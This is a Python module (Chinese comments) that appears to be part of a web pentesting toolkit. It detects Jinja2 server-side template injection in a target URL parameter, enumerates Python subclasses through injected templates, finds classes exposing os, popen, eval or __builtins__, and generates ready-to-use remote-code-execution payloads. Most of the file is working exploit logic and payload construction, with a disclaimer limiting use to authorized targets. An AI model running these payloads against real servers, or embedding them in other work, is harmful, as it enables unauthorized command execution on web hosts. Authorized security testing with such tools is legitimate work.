# -*- coding: utf-8 -*-
"""SSTI 子类枚举 & os/eval RCE 可达性检测纯逻辑模块。

核心逻辑：
    遍历 ``object.__subclasses__()`` 的每个子类 ``c``，检查
    ``c.__init__.__globals__`` 中是否存在 ``os`` / ``system`` / ``popen`` /
    ``eval`` / ``__builtins__`` 中的任意一个，命中即认为该子类提供了 RCE 路径，
    输出其索引、类名、命中的关键字，并给出利用 payload。

流程：
    1. 探活：注入 ``{{1337*7331}}``，看响应是否回显 ``9803921``；
    2. 枚举全部子类：``{% for c in ...__subclasses__() %}`` 逐条输出 ``idx:Name``；
    3. RCE 检测：服务端 ``for + if`` 过滤出 globals 里带目标键的子类；
    4. 生成利用 payload。

仅限授权靶场 / 渗透测试环境使用，请勿用于未授权目标。

本模块只做「目标 / 参数进、结构化结果出」的网络与文本处理，不导入任何 UI 模块，
不直接 ``print``，进度经 ``progress`` 回调吐出，失败抛 :class:`SSTIFinderError`。

代理约定（与其它 Web 工具一致）：请求会话统一经 :mod:`lib.proxy_pool` 的
``make_session()`` 创建 —— 启用全局代理池时自动走轮换代理，未启用时
``trust_env=False`` 直连。页面手填的「代理」文本框作为**覆盖**：填写时优先
使用手填代理，未填时才走全局代理池。
"""

from __future__ import annotations

import html
import re
import uuid
from collections.abc import Callable
from dataclasses import dataclass, field
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import requests
from requests.packages import urllib3

urllib3.disable_warnings()  # 目标站常见自签名证书，统一静默告警

#: 在 __globals__ 中检查的关键字，命中任意一个即视为具备 RCE 能力
RCE_KEYS = ("os", "system", "popen", "eval", "__builtins__")

#: 默认指向 object 类的前缀（可被 --prefix 覆盖）
DEFAULT_PREFIX = "().__class__.__bases__[0]"

#: 默认请求超时（秒）
DEFAULT_TIMEOUT = 15

#: 探活用的两个乘数（乘积用于比对响应）
PROBE_X, PROBE_Y = 1337, 7331

USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
)

ProgressFn = Callable[[str], None]


class SSTIFinderError(ValueError):
    """SSTI 检测失败时抛出的统一异常，由界面层统一捕获并展示。"""


@dataclass
class RceHit:
    """一个具备 RCE 能力的子类。

    index      子类在 ``__subclasses__()`` 里的索引
    name       子类名
    keys       命中的关键字列表（os / system / popen / eval / __builtins__）
    """

    index: int
    name: str
    keys: list[str] = field(default_factory=list)

    @property
    def payloads(self) -> list[str]:
        """根据命中关键字生成利用 payload 列表（``prefix`` 用默认 object 前缀）。"""
        return build_rce_payload(DEFAULT_PREFIX, self.index, self.keys)


# ---------------------------------------------------------------------------
# 一、纯函数（构造 / 解析）
# ---------------------------------------------------------------------------
def build_url(base_url: str, params: dict) -> str:
    """把 ``params`` 合并进 ``base_url`` 的 query 后返回完整 URL。"""
    p = urlparse(base_url)
    q = parse_qs(p.query, keep_blank_values=True)
    for k, v in params.items():
        q[k] = [str(v)]
    return urlunparse(p._replace(query=urlencode(q, doseq=True)))


def extract_between(text: str, start: str, end: str) -> str | None:
    """截取 ``start`` 与 ``end`` 之间的内容，未命中返回 None。"""
    i = text.find(start)
    if i == -1:
        return None
    i += len(start)
    j = text.find(end, i)
    if j == -1:
        return None
    return text[i:j]


def build_rce_payload(prefix: str, idx: int, keys: list[str]) -> list[str]:
    """根据命中的关键字给出利用 payload（把 ``id`` 换成需要的命令）。"""
    base = "{}.__subclasses__()[{}]".format(prefix, idx)
    tips: list[str] = []
    if "os" in keys:
        tips.append("{{ %s.__init__.__globals__['os'].popen('id').read() }}" % base)
    if "system" in keys:
        tips.append("{{ %s.__init__.__globals__['system']('id') }}" % base)
    if "popen" in keys:
        tips.append("{{ %s.__init__.__globals__['popen']('id').read() }}" % base)
    if "eval" in keys:
        tips.append(
            "{{ %s.__init__.__globals__['eval']"
            "(\"__import__('os').popen('id').read()\") }}" % base)
    if "__builtins__" in keys:
        tips.append(
            "{{ %s.__init__.__globals__['__builtins__']"
            "['__import__']('os').popen('id').read() }}" % base)
    if not tips:
        tips.append("{{ %s.__init__.__globals__ }}" % base)
    return tips


def parse_headers(text: str) -> dict[str, str]:
    """把「每行一个 Header（``Key: Value``）」的文本解析成请求头 dict。"""
    headers: dict[str, str] = {}
    for line in str(text or "").splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        key, sep, value = line.partition(":")
        if sep and key.strip():
            headers[key.strip()] = value.strip()
    return headers


def _parse_pairs(text: str) -> dict[str, str]:
    """把 ``a=1&b=2`` 形式的附加参数文本解析成 dict。"""
    pairs: dict[str, str] = {}
    for item in str(text or "").split("&"):
        item = item.strip()
        if not item or "=" not in item:
            continue
        k, _, v = item.partition("=")
        if k.strip():
            pairs[k.strip()] = v
    return pairs


# ---------------------------------------------------------------------------
# 二、核心类
# ---------------------------------------------------------------------------
class SSTIFinder:
    """SSTI 子类枚举 & RCE 可达性检测器。"""

    def __init__(
        self,
        url: str,
        param: str,
        method: str = "GET",
        data: str = "",
        cookie: str = "",
        headers: str = "",
        proxy: str = "",
        prefix: str = DEFAULT_PREFIX,
        timeout: float = DEFAULT_TIMEOUT,
    ) -> None:
        self.url = url
        self.param = param
        self.method = method.upper()
        self.prefix = prefix or DEFAULT_PREFIX
        self.timeout = timeout
        # 遵循 Web 工具统一约定：会话经 proxy_pool.make_session() 创建，
        # 启用全局代理池时自动走轮换代理，未启用时 trust_env=False 直连。
        # 页面手填的「代理」作为覆盖：填写时优先使用手填代理，覆盖全局代理池。
        from lib import proxy_pool

        self.session = proxy_pool.make_session("ssti_finder")
        self.session.headers.update({"User-Agent": USER_AGENT})
        if cookie:
            self.session.headers["Cookie"] = cookie
        self.session.headers.update(parse_headers(headers))
        if proxy:
            self.session.proxies = {"http": proxy, "https": proxy}

        self.base_data = _parse_pairs(data)

    # ---------------------------------------------------------------- 请求
    def _send(self, payload: str) -> str:
        params = dict(self.base_data)
        params[self.param] = payload
        if self.method == "POST":
            raw = self.session.post(
                self.url, data=params,
                timeout=self.timeout, verify=False, allow_redirects=True)
        else:
            raw = self.session.get(
                build_url(self.url, params),
                timeout=self.timeout, verify=False, allow_redirects=True)
        return raw.text

    def send(self, payload: str) -> str:
        """发一次请求，把 requests 异常压成 :class:`SSTIFinderError`。"""
        try:
            return self._send(payload)
        except requests.RequestException as exc:
            raise SSTIFinderError(f"请求失败：{exc}") from exc

    # ---------------------------------------------------------------- 探活
    def probe(self) -> bool:
        """注入 ``{{1337*7331}}`` 探测模板执行点是否可用。"""
        payload = "{{%d*%d}}" % (PROBE_X, PROBE_Y)
        text = self.send(payload)
        return str(PROBE_X * PROBE_Y) in text

    # ---------------------------------------------------------------- 枚举
    def enum_all_subclasses(self, marker: str) -> dict[int, str]:
        """枚举全部子类，返回 ``{索引: 类名}``；失败抛 :class:`SSTIFinderError`。"""
        start, end = marker + "_S", marker + "_E"
        payload = (
            start
            + "{% for c in " + self.prefix + ".__subclasses__() %}"
            + "{{ loop.index0 }}:{{ c.__name__ }}|"
            + "{% endfor %}"
            + end
        )
        text = self.send(payload)
        body = extract_between(text, start, end)
        if body is None:
            return {}

        result: dict[int, str] = {}
        for chunk in body.split("|"):
            m = re.search(r"(\d+)\s*:\s*([A-Za-z_]\w*)", chunk)
            if m:
                result[int(m.group(1))] = m.group(2)
        return result

    # ------------------------------------------------------- RCE 检测
    def find_rce_subclasses(self, marker: str) -> list[RceHit]:
        """服务端过滤出具备 RCE 能力的子类，返回 :class:`RceHit` 列表。"""
        start, end = marker + "_S", marker + "_E"
        payload = (
            start
            + "{% for c in " + self.prefix + ".__subclasses__() %}"
            + "{% set g = c.__init__.__globals__ %}"
            + "{% if g is defined %}"
            + "{% set k_os = g['os'] is defined %}"
            + "{% set k_sys = g['system'] is defined %}"
            + "{% set k_pop = g['popen'] is defined %}"
            + "{% set k_eval = g['eval'] is defined %}"
            + "{% set k_built = g['__builtins__'] is defined %}"
            + "{% if k_os or k_sys or k_pop or k_eval or k_built %}"
            + "{{ loop.index0 }}:{{ c.__name__ }}:"
            + "{{ 'os,' if k_os else '' }}"
            + "{{ 'system,' if k_sys else '' }}"
            + "{{ 'popen,' if k_pop else '' }}"
            + "{{ 'eval,' if k_eval else '' }}"
            + "{{ '__builtins__,' if k_built else '' }}"
            + "|"
            + "{% endif %}"
            + "{% endif %}"
            + "{% endfor %}"
            + end
        )
        text = self.send(payload)
        body = extract_between(text, start, end)
        if body is None:
            return []

        body = html.unescape(body)
        hits: list[RceHit] = []
        # 格式： idx:Name:os,eval,|idx2:Name2:os,|
        for chunk in body.split("|"):
            m = re.match(r"\s*(\d+)\s*:\s*([A-Za-z_]\w*)\s*:\s*([\w,]*)", chunk)
            if m:
                idx = int(m.group(1))
                name = m.group(2)
                keys = [k for k in m.group(3).split(",") if k]
                hits.append(RceHit(index=idx, name=name, keys=keys))
        return hits


# ---------------------------------------------------------------------------
# 三、组合入口
# ---------------------------------------------------------------------------
@dataclass
class SSTIReport:
    """一次完整 SSTI 检测的汇总结果。

    probe_ok       模板执行点是否可用
    subclasses     全部子类（{索引: 类名}，仅在需要时枚举）
    hits           具备 RCE 能力的子类
    """

    probe_ok: bool = False
    subclasses: dict[int, str] = field(default_factory=dict)
    hits: list[RceHit] = field(default_factory=list)


def _normalize_url(url: str) -> str:
    """补全协议头并去除首尾空白。"""
    text = str(url or "").strip()
    if text and "://" not in text:
        text = "http://" + text
    return text


def run(
    url: str,
    param: str,
    method: str = "GET",
    data: str = "",
    cookie: str = "",
    headers: str = "",
    proxy: str = "",
    prefix: str = DEFAULT_PREFIX,
    timeout: float = DEFAULT_TIMEOUT,
    enum_all: bool = False,
    progress: ProgressFn | None = None,
    stop=None,
) -> SSTIReport:
    """执行完整 SSTI 检测，返回 :class:`SSTIReport`；失败抛 :class:`SSTIFinderError`。

    - ``enum_all`` 为 True 时额外枚举全部子类（供过滤 / 人工翻找）；
    - ``progress`` 回调回报阶段进度；``stop`` 为 ``threading.Event``，置位后提前结束。
    """
    target = _normalize_url(url)
    if not urlparse(target).netloc:
        raise SSTIFinderError("请填写形如 https://example.com 的有效 URL")
    if not str(param or "").strip():
        raise SSTIFinderError("请填写注入参数名")

    finder = SSTIFinder(
        target, param, method=method, data=data, cookie=cookie,
        headers=headers, proxy=proxy, prefix=prefix, timeout=timeout)

    report = SSTIReport()

    if progress:
        progress("正在探测模板执行点…")
    if stop is not None and stop.is_set():
        return report
    report.probe_ok = finder.probe()

    marker = "SSTIX" + uuid.uuid4().hex[:10]

    if enum_all:
        if progress:
            progress("正在枚举全部子类…")
        if stop is not None and stop.is_set():
            return report
        report.subclasses = finder.enum_all_subclasses(marker)
        if progress:
            progress(f"已获取 {len(report.subclasses)} 个子类")

    if progress:
        progress("正在检测具备 os/eval RCE 能力的子类…")
    if stop is not None and stop.is_set():
        return report
    report.hits = finder.find_rce_subclasses(marker)
    if progress:
        progress(f"检测完成：发现 {len(report.hits)} 个具备 RCE 能力的子类")

    return report
